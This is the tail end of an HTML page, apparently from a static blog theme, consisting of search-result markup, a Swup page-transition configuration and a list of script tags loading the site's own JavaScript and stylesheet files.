				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>